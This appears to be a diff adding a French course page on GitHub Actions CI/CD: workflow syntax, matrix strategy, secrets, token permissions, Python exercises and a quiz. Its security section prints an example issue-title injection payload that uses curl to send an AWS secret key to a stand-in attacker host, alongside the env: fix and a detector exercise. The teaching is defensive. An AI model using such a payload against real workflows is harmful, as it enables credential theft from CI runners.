@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Chapitre 5 — Automatisation &amp;amp; CI/CD avec GitHub Actions | Git &amp; GitHub B3</title>
+<meta name="description" content="Chapitre 5 du cours Git &amp; GitHub B3 : Syntaxe déclarative YAML, événements déclencheurs, runners, stratégie matricielle multi-plateforme (strategy.matrix), gestion des secrets et durcissement contre les injections de commandes. Notions fondamentales, ateliers de programmation interactifs, QCM corrigés.">
+<link rel="canonical" href="https://revi-mu.vercel.app/b3-github/chapitres/chapitre5.html">
+<meta property="og:title" content="Chapitre 5 — Automatisation &amp;amp; CI/CD avec GitHub Actions | Git &amp; GitHub B3">
+<meta property="og:description" content="Chapitre 5 du cours Git &amp; GitHub B3 : Syntaxe déclarative YAML, événements déclencheurs, runners, stratégie matricielle multi-plateforme (strategy.matrix), gestion des secrets et durcissement contre les injections de commandes. Notions fondamentales, ateliers de programmation interactifs, QCM corrigés.">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<link rel="icon" href="/assets/img/favicon.svg" type="image/svg+xml">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700;800&display=swap">
+<link rel="stylesheet" href="/assets/css/tokens.css">
+<link rel="stylesheet" href="../assets/css/cours.css">
+<link rel="stylesheet" href="/assets/css/code-lab.css">
+<script src="/assets/js/theme.js"></script>
+</head>
+<body data-chapter="5">
+
+<nav class="skip-nav" aria-label="Accès rapide"><a href="#content" class="skip-link">Aller au contenu</a></nav>
+
+<nav class="b3-githubnav"><div class="b3-githubnav__in">
+  <a class="b3-githubnav__home" href="/" title="Accueil — Tous les portails" aria-label="Accueil — Tous les portails"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-house"></use></svg> <span>Portail</span></a>
+  <span class="b3-githubnav__sep" aria-hidden="true">/</span>
+  <a class="b3-githubnav__brand" href="../index.html"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-code"></use></svg> Git &amp; GitHub B3</a>
+  <div class="b3-githubnav__links">
+    <a href="../sommaire.html">Sommaire</a>
+    <a href="../chapitres/chapitre1.html">Ch. 1</a>
+    <a href="../chapitres/chapitre2.html">Ch. 2</a>
+    <a href="../chapitres/chapitre3.html">Ch. 3</a>
+    <a href="../chapitres/chapitre4.html">Ch. 4</a>
+    <a href="../chapitres/chapitre5.html" class="is-active">Ch. 5</a>
+    <a href="../chapitres/chapitre6.html">Ch. 6</a>
+    <a href="../chapitres/cartes.html">Cartes</a>
+    <a href="../chapitres/formules.html">Mémo</a>
+    <a href="../exercices/exercices.html">Exercices</a>
+    <a href="../atelier.html">Atelier</a>
+    <a href="../chapitres/simulateur-examen.html">Examen</a>
+  </div>
+  <div class="b3-githubnav__actions">
+    <button type="button" class="theme-toggle" id="themeToggle" aria-label="Activer le mode sombre" title="Basculer le thème clair / sombre">
+      <svg class="theme-toggle__sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></svg>
+      <svg class="theme-toggle__moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><path d="M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z"/></svg>
+    </button>
+  </div>
+</div></nav>
+
+<main id="content" class="b3-githubwrap">
+<p class="crumb"><a href="../index.html">Git & GitHub B3</a> › <a href="../sommaire.html">Sommaire</a> › Chapitre 5</p>
+
+<h1>Chapitre 5 — Automatisation &amp; CI/CD avec GitHub Actions</h1>
+
+<div class="chapmeta">
+    <span class="tag">Module 5</span>
+    <span class="tag tag--time">≈ 2 h 45 de travail</span>
+    <span class="tag tag--time">Réservé B3 et plus</span>
+  </div>
+
+  <div class="box box--situation">
+    <div class="box__title"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-play"></use></svg> Mise en situation</div>
+    <p>Dans les organisations technologiques modernes, le dépôt Git ne se contente plus de stocker du code : il est devenu le moteur central de l’automatisation du cycle de vie logiciel (DevOps). Grâce à GitHub Actions, chaque événement (push, création de Pull Request, publication de release, planification cron) peut déclencher des pipelines d’intégration et de déploiement continus (CI/CD). Cependant, écrire des fichiers de workflow sans maîtrise de la sécurité expose l’entreprise à des risques dévastateurs : exécution de code malveillant via des injections shell non filtrées, vol de secrets de production (clés cloud AWS/Azure) ou fuite de paquets contrefaits. L’ingénieur de niveau Bachelor 3 doit savoir concevoir des workflows performants et scalables avec des stratégies matricielles multi-plateformes, tout en appliquant un durcissement sécuritaire intransigeant.</p>
+  </div>
+
+  <div class="box box--objectifs">
+    <div class="box__title"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-target"></use></svg> Objectifs pédagogiques</div>
+    <p>À la fin de ce chapitre, tu seras capable de :</p>
+    <ol>
+      <li>maîtriser la syntaxe déclarative YAML des workflows GitHub Actions (.github/workflows/) ;</li>
+      <li>comprendre l’architecture distribuée : événements déclencheurs, jobs parallèles/dépendants et runners hébergés ou auto-hébergés ;</li>
+      <li>concevoir des matrices d’exécution (strategy.matrix) pour valider le code sur plusieurs systèmes d’exploitation et versions de langages ;</li>
+      <li>identifier et neutraliser les failles critiques d’injection de commande shell dans les contextes dynamiques ${{ github.event... }} ;</li>
+      <li>appliquer le principe du moindre privilège aux tokens d’authentification automatiques (GITHUB_TOKEN) via le bloc permissions ;</li>
+      <li>développer en Python 3 des auditeurs de syntaxe de workflow, des expandeurs de matrices et des scanners de vulnérabilités CI/CD.</li>
+    </ol>
+  </div>
+
+<h2>1. Anatomie d’un Pipeline CI/CD : Workflows, Événements, Jobs &amp; Runners</h2>
+
+<p>GitHub Actions est une plateforme d’automatisation intégrée dont la configuration repose sur des fichiers YAML stockés impérativement dans le répertoire <code>.github/workflows/</code> du dépôt.</p>
+<div class="grid grid-2">
+  <div class="card">
+    <h4>Structure Hiérarchique</h4>
+    <ul>
+      <li><strong>Workflow :</strong> Processus automatisé autonome défini dans un fichier <code>.yml</code>.</li>
+      <li><strong>Events (on:) :</strong> Événements déclencheurs (ex: <code>push</code>, <code>pull_request</code>, <code>workflow_dispatch</code>, <code>schedule</code>).</li>
+      <li><strong>Jobs :</strong> Ensemble d’étapes séquentielles exécutées sur le même environnement. Par défaut, les jobs s’exécutent <strong>en parallèle</strong> (sauf en cas d’utilisation de <code>needs:</code> pour créer un graphe acyclique de dépendances).</li>
+      <li><strong>Runners (runs-on:) :</strong> Machines virtuelles (Ubuntu, Windows, macOS) ou conteneurs exécutant le job.</li>
+    </ul>
+  </div>
+  <div class="card">
+    <h4>Étapes &amp; Actions Réutilisables</h4>
+    <p>Chaque job est constitué d’une liste ordonnée de <code>steps</code> :</p>
+    <ul>
+      <li><code>uses:</code> : Invoque une action communautaire ou interne (ex: <code>actions/checkout@v4</code> pour cloner le code, <code>actions/setup-python@v5</code> pour installer l’interpréteur).</li>
+      <li><code>run:</code> : Exécute des commandes en ligne de commande dans le shell natif (bash, sh, powershell).</li>
+      <li><code>env:</code> : Définit des variables d’environnement locales à l’étape.</li>
+    </ul>
+  </div>
+</div>
+
+<h2>2. Stratégie Matricielle (strategy.matrix) : Parallélisation Multi-Axes</h2>
+
+<p>Pour tester une bibliothèque sur une multitude de configurations sans dupliquer des dizaines de fichiers de workflow, GitHub Actions propose la <strong>stratégie matricielle</strong> :</p>
+<pre><code>jobs:
+  test:
+    runs-on: ${{ matrix.os }}
+    strategy:
+      fail-fast: false
+      matrix:
+        os: [ubuntu-latest, windows-latest, macos-latest]
+        python-version: ["3.10", "3.11", "3.12"]
+        include:
+          - os: ubuntu-latest
+            python-version: "3.13-dev"
+        exclude:
+          - os: windows-latest
+            python-version: "3.10"</code></pre>
+  <div class="box box--standard">
+    <div class="box__title"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-info"></use></svg> Mécanique du Produit Cartésien &amp; Options Avancées</div>
+<p>Le moteur calcule le produit cartésien de tous les axes déclarés : dans l’exemple ci-dessus, $3 \times 3 = 9$ jobs sont instanciés en parallèle, auxquels s’ajoute 1 job spécifique via <code>include:</code> et se soustrait 1 combinaison incompatible via <code>exclude:</code>, soit 9 jobs au total.</p>,<p>La directive <code>fail-fast: false</code> est capitale : par défaut (<code>true</code>), dès qu’un job échoue, GitHub annule tous les autres jobs de la matrice. En la fixant à <code>false</code>, on observe le résultat complet sur toutes les plateformes pour diagnostiquer les incompatibilités d’OS.</p>
+  </div>
+
+<h2>3. Sécurité des Workflows : Faille Critique d’Injection de Commande Shell</h2>
+
+<p>L’erreur de sécurité la plus répandue et la plus destructrice dans GitHub Actions est l’<strong>injection directe de variables de contexte dans un script shell</strong> (CWE-78 : OS Command Injection).</p>
+  <div class="box box--danger">
+    <div class="box__title"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-info"></use></svg> Anatomie d’une Faille d’Injection dans un bloc run:</div>
+<p>Soit le step apparemment anodin suivant réagissant à l’ouverture d’une issue :</p>,<pre><code>- name: Verifier titre issue
+  run: echo "Nouveau titre : ${{ github.event.issue.title }}"</code></pre>,<p>Comme GitHub Actions résout l’expression <code>${{ ... }}</code> par substitution textuelle brute <strong>avant</strong> de passer le script au shell bash, un attaquant qui soumet une issue avec le titre suivant :</p>,<pre><code>Test"; curl -s https://evil.attacker/exfil?token=$AWS_SECRET_ACCESS_KEY; echo "Fin</code></pre>,<p>provoquera l’exécution directe de la commande arbitraire <code>curl</code> dans le runner, exfiltrant les secrets du dépôt !</p>,<p><strong>Remédiation obligatoire :</strong> Toujours passer les entrées non fiables par des <strong>variables d’environnement intermédiaires</strong> :</p>,<pre><code>- name: Traitement securise
+  env:
+    ISSUE_TITLE: ${{ github.event.issue.title }}
+  run: echo "Nouveau titre : $ISSUE_TITLE"</code></pre>
+  </div>
+
+<h2>4. Secrets de Dépôt, Principe du Moindre Privilège &amp; GITHUB_TOKEN</h2>
+
+<p>La gestion des identifiants et des accès dans les pipelines d’intégration continue repose sur deux piliers majeurs :</p>
+<div class="grid grid-2">
+  <div class="card">
+    <h4>1. Les Secrets GitHub (Encrypted Secrets)</h4>
+    <ul>
+      <li>Stockés sous forme chiffrée (NaCl box) sur les serveurs GitHub.</li>
+      <li>Accessibles uniquement dans les workflows via <code>${{ secrets.NOM_SECRET }}</code>.</li>
+      <li>GitHub masque automatiquement (redaction) la valeur du secret dans les logs console en remplaçant la chaîne par <code>***</code>.</li>
+    </ul>
+  </div>
+  <div class="card">
+    <h4>2. Le Token Automatique GITHUB_TOKEN</h4>
+    <p>Généré dynamiquement au début de chaque job et révoqué à la fin. Pour éviter qu’un attaquant exploitant une faille de dépendance n’utilise ce token pour écraser le code du dépôt, on applique le <strong>principe du moindre privilège</strong> :</p>
+    <pre><code>permissions:
+  contents: read
+  issues: write
+  pull-requests: read</code></pre>
+    <p>Tout droit non explicitement mentionné est strictement révoqué.</p>
+  </div>
+</div>
+
+<!-- code-labs:start -->
+  <h2>5. Exercices de code</h2>
+  <p class="lead">Ces trois exercices se font dans la page. L’éditeur du navigateur exécute votre code
+  sur un service distant, puis la validation fait tourner des tests que vous ne voyez pas :
+  réussir l’exemple affiché ne suffit donc pas, il faut traiter le cas général.</p>
+  <p>En cas d’erreur, le bouton <strong>Expliquer mon erreur</strong> interroge le tuteur : il décrit ce qui
+  s’est passé et par où chercher, sans jamais écrire de code à votre place — c’est le principe de l’exercice.</p>
+<div class="lab" data-lab
+     data-exercise="gh3-c5-e1"
+     data-language="python"
+     data-height="300"
+     data-stdin="NAME=CI-Pipeline&#10;TRIGGERS=push,pull_request&#10;JOB id=build runs_on=ubuntu-latest steps_count=3">
+  <script type="text/plain" data-lab-starter>import sys
+
+lignes = [l.strip() for l in sys.stdin.read().splitlines() if l.strip()]
+
+# À compléter : valider la structure du workflow GitHub Actions
+</script>
+  <div class="lab__head">
+    <h3 class="lab__title">Exercice 1 — Validateur de structure de workflow GitHub Actions</h3>
+    <div class="lab__meta">
+      <span class="lab__lang"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-terminal"></use></svg> Python</span>
+      <span class="badge badge--n1">Niveau 1 — Acquisition</span>
+    </div>
+  </div>
+  <div class="lab__body">
+    <p class="lab__goal"><strong>Objectif :</strong> Analyser la spécification d’un pipeline GitHub Actions et valider la présence des blocs obligatoires.</p>
+    <div class="lab__brief"><p>Un workflow GitHub Actions (fichier <code>.github/workflows/*.yml</code>) doit respecter une arborescence minimale :<br><br>
+Critères de conformité :<br>
+1. <code>name</code> : doit être renseigné (chaîne non vide).<br>
+2. Déclencheurs <code>on:</code> : au moins un événement déclencheur parmi <code>push</code>, <code>pull_request</code>, <code>workflow_dispatch</code>, <code>schedule</code>.<br>
+3. <code>jobs</code> : au moins un job déclaré. Chaque job doit obligatoirement comporter :<br>
+   - Une cible d'exécution <code>runs-on</code> (ex: <code>ubuntu-latest</code>, <code>windows-latest</code>).<br>
+   - Au moins une étape <code>step</code> déclarée.<br><br>
+Le script lit la description linéaire d'un workflow :<br>
+<code>NAME=&lt;nom&gt;</code><br>
+<code>TRIGGERS=&lt;trig1,trig2...&gt;</code><br>
+<code>JOB id=&lt;id&gt; runs_on=&lt;runner|NONE&gt; steps_count=&lt;n&gt;</code>.<br><br>
+Pour le workflow, afficher :<br>
+<code>WORKFLOW_AUDIT name="{nom}" status={VALID | ERREUR} triggers_count={n} jobs_count={m}</code><br>
+Erreurs possibles : <code>MISSING_NAME</code>, <code>MISSING_TRIGGERS</code>, <code>NO_JOBS</code>, <code>JOB_MISSING_RUNS_ON</code>, <code>JOB_ZERO_STEPS</code>.</p></div>
+    <div class="lab__sample">
+      <div class="lab__sample-part"><b>Entrée du programme</b><pre>NAME=CI-Pipeline
+TRIGGERS=push,pull_request
+JOB id=build runs_on=ubuntu-latest steps_count=3</pre></div>
+      <div class="lab__sample-part"><b>Sortie attendue</b><pre>WORKFLOW_AUDIT name="CI-Pipeline" status=VALID triggers_count=2 jobs_count=1</pre></div>
+    </div>
+    <p class="lab__note">Workflow complet et bien formé.</p>
+    <details class="lab__hints">
+      <summary><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-lightbulb"></use></svg> Deux indices, rédigés en mots</summary>
+      <ol>
+        <li>Valider les prérequis dans l’ordre : name, triggers, jobs, puis les contraintes par job.</li>
+        <li>S’arrêter au premier défaut identifié.</li>
+      </ol>
+    </details>
+  </div>
+</div>
+
+<div class="lab" data-lab
+     data-exercise="gh3-c5-e2"
+     data-language="python"
+     data-height="300"
+     data-stdin="MATRIX_DEF os=ubuntu,macos version=3.11,3.12&#10;EXCLUDE os=macos version=3.11">
+  <script type="text/plain" data-lab-starter>import sys
+
+lignes = [l.strip() for l in sys.stdin.read().splitlines() if l.strip()]
+
+# À compléter : calculer le produit cartésien de la matrice
+</script>
+  <div class="lab__head">
+    <h3 class="lab__title">Exercice 2 — Générateur et évaluateur de matrice de build (strategy: matrix)</h3>
+    <div class="lab__meta">
+      <span class="lab__lang"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-terminal"></use></svg> Python</span>
+      <span class="badge badge--n2">Niveau 2 — Application</span>
+    </div>
+  </div>
+  <div class="lab__body">
+    <p class="lab__goal"><strong>Objectif :</strong> Calculer le produit cartésien des axes d’une matrice de test GitHub Actions et gérer les exclusions.</p>
+    <div class="lab__brief"><p>La directive <code>strategy: matrix</code> permet d'exécuter un job en parallèle sur de multiples combinaisons d'environnements (OS x Version de langage).<br><br>
+Spécification :<br>
+- Liste d'OS : <code>os=&lt;os1,os2...&gt;</code>.<br>
+- Liste de versions de runtime : <code>version=&lt;v1,v2...&gt;</code>.<br>
+- Exclusions optionnelles (<code>EXCLUDE os=&lt;os&gt; version=&lt;v&gt;</code>).<br><br>
+Le script lit la définition sur l'entrée standard :<br>
+<code>MATRIX_DEF os=&lt;liste_os&gt; version=&lt;liste_versions&gt;</code><br>
+Puis zéro, une ou plusieurs lignes <code>EXCLUDE os=&lt;os&gt; version=&lt;v&gt;</code>.<br><br>
+Le script doit calculer la liste des combinaisons valides (produit cartésien moins exclusions), triée par OS puis par version, et afficher :<br>
+Chaque combinaison :<br>
+<code>JOB_INSTANCE os={os} version={v} tag="{os}-{v}"</code><br>
+Et la ligne récapitulative :<br>
+<code>MATRIX_TOTAL instances={n} excluded={nb_exclus}</code></p></div>
+    <div class="lab__sample">
+      <div class="lab__sample-part"><b>Entrée du programme</b><pre>MATRIX_DEF os=ubuntu,macos version=3.11,3.12
+EXCLUDE os=macos version=3.11</pre></div>
+      <div class="lab__sample-part"><b>Sortie attendue</b><pre>JOB_INSTANCE os=ubuntu version=3.11 tag="ubuntu-3.11"
+JOB_INSTANCE os=ubuntu version=3.12 tag="ubuntu-3.12"
+JOB_INSTANCE os=macos version=3.12 tag="macos-3.12"
+MATRIX_TOTAL instances=3 excluded=1</pre></div>
+    </div>
+    <p class="lab__note">4 combinaisons initiales moins 1 exclusion = 3 instances exécutées.</p>
+    <details class="lab__hints">
+      <summary><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-lightbulb"></use></svg> Deux indices, rédigés en mots</summary>
+      <ol>
+        <li>Générer toutes les paires (o, v) via deux boucles imbriquées.</li>
+        <li>Filtrer les paires présentes dans l’ensemble des exclusions.</li>
+      </ol>
+    </details>
+  </div>
+</div>
+
+<div class="lab" data-lab
+     data-exercise="gh3-c5-e3"
+     data-language="python"
+     data-height="300"
+     data-stdin="STEP_INSPECT id=1 cmd=echo &quot;Le titre est ${{ github.event.issue.title }}&quot;&#10;STEP_INSPECT id=2 cmd=echo ${{ secrets.AWS_KEY }}">
+  <script type="text/plain" data-lab-starter>import sys
+
+lignes = [l.strip() for l in sys.stdin.read().splitlines() if l.strip()]
+
+# À compléter : analyser la sécurité des étapes GitHub Actions
+</script>
+  <div class="lab__head">
+    <h3 class="lab__title">Exercice 3 — Détecteur d’injections de commandes et fuites de secrets dans les Actions</h3>
+    <div class="lab__meta">
+      <span class="lab__lang"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-terminal"></use></svg> Python</span>
+      <span class="badge badge--n3">Niveau 3 — Raisonnement</span>
+    </div>
+  </div>
+  <div class="lab__body">
+    <p class="lab__goal"><strong>Objectif :</strong> Auditer les étapes de scripts GitHub Actions pour détecter les failles d’injection de commande et divulgation de secrets.</p>
+    <div class="lab__brief"><p>Dans GitHub Actions, l’utilisation imprudente d’expressions de contexte dans la directive <code>run:</code> expose le runner à une exécution de code arbitraire (RCE) ou à l'exfiltration de jetons secrets.<br><br>
+Vulnérabilités à détecter :<br>
+1. <strong>Fuite de secret (Secret Leak)</strong> : présence de <code>secrets.</code> ou <code>GITHUB_TOKEN</code> à l'intérieur d'une commande <code>echo</code> ou <code>print</code>.<br>
+   -> Verdict : <code>VULN_EXPOSED_SECRET</code>.<br>
+2. <strong>Injection de commande shell</strong> : concaténation directe d'entrées utilisateur non fiables au sein de la ligne de commande <code>run:</code>, telles que <code>${{ github.event.issue.title }}</code>, <code>${{ github.event.issue.body }}</code>, <code>${{ github.event.comment.body }}</code>, <code>${{ github.head_ref }}</code>.<br>
+   (La bonne pratique est de passer par des variables d'environnement <code>env:</code>).<br>
+   -> Verdict : <code>VULN_COMMAND_INJECTION</code>.<br>
+3. Sinon : étape conforme (<code>SECURE</code>).<br><br>
+Le script lit sur l'entrée standard :<br>
+<code>STEP_INSPECT id=&lt;id&gt; cmd=&lt;commande_du_step&gt;</code>.<br><br>
+Pour chaque étape, afficher :<br>
+<code>ACTION_AUDIT step={id} status={SECURE|VULN_EXPOSED_SECRET|VULN_COMMAND_INJECTION}</code></p></div>
+    <div class="lab__sample">
+      <div class="lab__sample-part"><b>Entrée du programme</b><pre>STEP_INSPECT id=1 cmd=echo "Le titre est ${{ github.event.issue.title }}"
+STEP_INSPECT id=2 cmd=echo ${{ secrets.AWS_KEY }}</pre></div>
+      <div class="lab__sample-part"><b>Sortie attendue</b><pre>ACTION_AUDIT step=1 status=VULN_COMMAND_INJECTION
+ACTION_AUDIT step=2 status=VULN_EXPOSED_SECRET</pre></div>
+    </div>
+    <p class="lab__note">Le step 1 permet l’injection via un titre malveillant, le step 2 fait fuiter la clé AWS.</p>
+    <details class="lab__hints">
+      <summary><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-lightbulb"></use></svg> Deux indices, rédigés en mots</summary>
+      <ol>
+        <li>Vérifier d’abord si echo affiche un secret.</li>
+        <li>Vérifier la présence d’expressions de contexte non assainies dans la commande.</li>
+      </ol>
+    </details>
+  </div>
+</div>
+  <!-- code-labs:end -->
+  <h2>6. QCM — niveau examen</h2>
+
+  <div class="qcm">
+    <div class="q">
+      <p class="q__stem">Dans quel sous-dossier exact du dépôt les fichiers de workflow GitHub Actions doivent-ils être impérativement enregistrés ?</p>
+      <div class="opts">
+        <button class="opt">.github/actions/</button>
+        <button class="opt" data-correct="1">.github/workflows/</button>
+        <button class="opt">.git/workflows/</button>
+        <button class="opt">ci/pipelines/</button>
+      </div>
+      <div class="q__exp">GitHub lit exclusivement les fichiers de définition de workflow au format YAML situés dans le répertoire .github/workflows/ à la racine du dépôt.</div>
+    </div>
+    <div class="q">
+      <p class="q__stem">Quel est le comportement d’exécution par défaut de deux jobs déclarés au même niveau dans un workflow si aucune directive « needs: » n’est précisée ?</p>
+      <div class="opts">
+        <button class="opt">Ils s’exécutent en série l’un après l’autre dans l’ordre du fichier</button>
+        <button class="opt" data-correct="1">Ils s’exécutent en parallèle simultanément sur des runners indépendants</button>
+        <button class="opt">Le premier bloque l’exécution du second jusqu’à approbation manuelle</button>
+        <button class="opt">Le second écrase automatiquement les résultats du premier</button>
+      </div>
+      <div class="q__exp">Par défaut, tous les jobs d’un workflow sont indépendants et s’exécutent en parallèle, sauf si une dépendance explicite est introduite via le mot-clé needs:.</div>
+    </div>
+    <div class="q">
+      <p class="q__stem">Pourquoi l’instruction « run: echo "Branche : ${{ github.head_ref }}" » représente-t-elle une vulnérabilité critique ?</p>
+      <div class="opts">
+        <button class="opt">Parce que GitHub Actions ne supporte pas la commande echo sous Linux</button>
+        <button class="opt" data-correct="1">Parce qu’un attaquant peut nommer sa branche avec des métacaractères shell pour exécuter du code arbitraire</button>
+        <button class="opt">Parce que le nom de branche est effacé par le runner avant l’exécution</button>
+        <button class="opt">Parce que cette syntaxe consomme deux fois plus de crédits de calcul</button>
+      </div>
+      <div class="q__exp">L’expression ${{ github.head_ref }} est substituée textuellement avant l’appel du shell : un nom de branche contenant des points-virgules ou guillemets permet d’injecter des commandes malveillantes (Command Injection).</div>
+    </div>
+    <div class="q">
+      <p class="q__stem">Quelle est la méthode recommandée pour assainir l’utilisation d’un paramètre dynamique issu de l’événement GitHub dans un script shell ?</p>
+      <div class="opts">
+        <button class="opt">L’encoder en base64 dans le message de commit</button>
+        <button class="opt" data-correct="1">Le déclarer dans le bloc « env: » de l’étape et manipuler la variable d’environnement correspondante dans le script</button>
+        <button class="opt">Désactiver l’interpréteur bash au profit de sh standard</button>
+        <button class="opt">Exécuter le workflow uniquement sur des machines Windows</button>
+      </div>
+      <div class="q__exp">En passant la valeur via le bloc env: (ex: BRANCH: ${{ github.head_ref }}), le moteur transmet la donnée comme valeur d’environnement et le shell ne tente pas de l’interpréter comme du code exécutable.</div>
+    </div>
+    <div class="q">
+      <p class="q__stem">Que produit la directive « strategy.matrix » avec os: [ubuntu, windows] et node: [18, 20] ?</p>
+      <div class="opts">
+        <button class="opt">Exactement 2 jobs (ubuntu avec 18, et windows avec 20)</button>
+        <button class="opt" data-correct="1">Exactement 4 jobs correspondant au produit cartésien de tous les axes</button>
+        <button class="opt">1 seul job qui alterne les systèmes d’exploitation</button>
+        <button class="opt">Une erreur de syntaxe si le mot-clé axes: n’est pas spécifié</button>
+      </div>
+      <div class="q__exp">strategy.matrix calcule le produit cartésien : 2 systèmes × 2 versions = 4 jobs indépendants exécutés en parallèle.</div>
+    </div>
+    <div class="q">
+      <p class="q__stem">Que provoque la directive « fail-fast: false » au sein d’une stratégie matricielle ?</p>
+      <div class="opts">
+        <button class="opt">Le workflow s’arrête immédiatement dès qu’un job réussit</button>
+        <button class="opt" data-correct="1">Tous les autres jobs de la matrice continuent de s’exécuter même si l’un d’eux échoue</button>
+        <button class="opt">Les erreurs de tests sont ignorées et le statut final est toujours vert</button>
+        <button class="opt">La matrice est exécutée séquentiellement pour économiser de la mémoire</button>
+      </div>
+      <div class="q__exp">Par défaut (fail-fast: true), l’échec d’un job stoppe immédiatement tous les autres. En fixant fail-fast: false, on permet à chaque configuration de mener ses tests à terme pour avoir un diagnostic complet.</div>
+    </div>
+    <div class="q">
+      <p class="q__stem">Comment restreindre les droits du token d’authentification automatique à la seule lecture du code source dans un workflow ?</p>
+      <div class="opts">
+        <button class="opt" data-correct="1">permissions: { contents: read }</button>
+        <button class="opt">security: { read-only: true }</button>
+        <button class="opt">auth: { level: minimal }</button>
+        <button class="opt">token: { write: false }</button>
+      </div>
+      <div class="q__exp">Le bloc déclaratif standard permissions: permet de spécifier les scopes autorisés, ici contents: read pour autoriser uniquement la lecture du dépôt.</div>
+    </div>
+    <div class="q">
+      <p class="q__stem">Pourquoi est-il fortement conseillé d’épingler les actions tierces par leur hash de commit complet (ex: uses: actions/checkout@b4ffde...) ?</p>
+      <div class="opts">
+        <button class="opt">Pour accélérer le téléchargement depuis le cache local</button>
+        <button class="opt" data-correct="1">Pour se prémunir contre la compromission d’un tag de version mutable sur le dépôt de l’action (Supply Chain Attack)</button>
+        <button class="opt">Parce que GitHub refuse d’exécuter les actions référencées par des tags</button>
+        <button class="opt">Pour rendre l’action compatible avec Windows et macOS</button>
+      </div>
+      <div class="q__exp">Un tag (comme @v4) est une référence modifiable par le propriétaire du dépôt de l’action : un attaquant qui compromettrait ce dépôt pourrait y pousser du code hostile. Le hash SHA immuable garantit l’intégrité absolue.</div>
+    </div>
+  </div>
+
+<h2>7. Erreurs classiques — récapitulatif</h2>
+
+  <div class="box box--pitfall">
+    <div class="box__title"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-warning"></use></svg> À reconnaître en examen</div>
+    <ul>
+      <li>Écrire ${{ github.head_ref }} ou ${{ github.event... }} directement dans un script bash exécuté dans run:.</li>
+      <li>Laisser les permissions par défaut en lecture/écriture complète pour le GITHUB_TOKEN sur tous les dépôts.</li>
+      <li>Faire un echo d’un secret dans un fichier temporaire qui est ensuite archivé comme artifact public du workflow.</li>
+      <li>Oublier le drapeau fail-fast: false lorsqu’on souhaite obtenir le rapport de test complet sur tous les OS.</li>
+    </ul>
+  </div>
+
+<h2>8. Méthodologie de résolution</h2>
+
+  <div class="box box--method">
+    <div class="box__title"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-compass"></use></svg> Méthode d’Ingénierie : Durcissement d’un Pipeline CI/CD GitHub Actions</div>
+    <ol>
+      <li>Étape 1 : Structurer le workflow avec les déclencheurs les plus stricts possibles (ex: on: pull_request avec branches: [main]).</li>
+      <li>Étape 2 : Épingler les actions communautaires avec leur hash de commit SHA complet plutôt qu’un tag mutable (ex: actions/checkout@b4ffde...).</li>
+      <li>Étape 3 : Restreindre systématiquement les permissions du token d’exécution en tête de fichier via permissions: { contents: read }.</li>
+      <li>Étape 4 : Scanner tous les blocs run: pour s’assurer qu’aucune expression ${{ github.event... }} n’est insérée directement dans une commande shell.</li>
+      <li>Étape 5 : Isoler les secrets de déploiement au sein d’Environments GitHub avec règles d’approbation manuelle (Reviewers obligatoires).</li>
+      <li>Étape 6 : Activer le timeout maximal (timeout-minutes: 15) pour éviter qu’un job bloqué ne consomme tout le quota de l’organisation.</li>
+    </ol>
+  </div>
+
+<h2>9. Révision active</h2>
+
+  <div class="box box--revision">
+    <div class="box__title"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-pin"></use></svg> Résumé essentiel</div>
+    <ul>
+      <li>Les workflows GitHub Actions sont déclarés en YAML sous .github/workflows/.</li>
+      <li>Un workflow réagit à des événements (on:), organise des jobs parallèles ou séquentiels (needs:) exécutés sur des runners.</li>
+      <li>strategy.matrix génère le produit cartésien d’axes d’exécution (OS, versions) pour tester en parallèle.</li>
+      <li>fail-fast: false permet de poursuivre les tests sur toutes les configurations même si l’une d’elles échoue.</li>
+      <li>Ne JAMAIS concaténer ${{ github.event... }} dans un run: shell : risque majeur d’injection de commande (CWE-78).</li>
+      <li>Toujours passer les données dynamiques par le bloc env: pour que le shell les traite comme de simples variables textuelles.</li>
+      <li>Configurer systématiquement les permissions du GITHUB_TOKEN selon le principe du moindre privilège.</li>
+    </ul>
+    <h3>Checklist de maîtrise</h3>
+    <ul class="check">
+      <li>Je sais structurer un fichier de workflow valide avec les sections on, jobs et steps.</li>
+      <li>Je comprends la différence entre l’exécution par défaut des jobs en parallèle et séquentielle via needs:.</li>
+      <li>Je sais concevoir une matrice strategy.matrix avec inclusions et exclusions personnalisées.</li>
+      <li>Je sais identifier et corriger une faille d’injection de commande dans un step de workflow.</li>
